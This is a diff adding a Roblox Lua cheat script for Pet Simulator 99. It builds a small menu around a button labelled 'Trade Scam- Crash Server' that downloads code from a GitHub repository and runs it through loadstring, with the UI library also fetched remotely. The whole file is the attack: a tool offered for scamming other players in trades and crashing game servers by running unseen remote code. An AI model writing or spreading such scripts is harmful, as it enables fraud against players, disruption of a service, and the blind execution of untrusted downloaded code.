@@ -1,0 +1,13 @@
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Ruby Scripts | Pet Simulator 99! ", "Sentinel")
+
+-- MAIN
+local Main = Window:NewTab("V9")
+local MainSection = Main:NewSection("•Still Active•")
+
+MainSection:NewButton("Trade Scam- Crash Server", "Scam", function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hatdog69/Ruby-Hub-Script/main/V9"))()
+
+end)
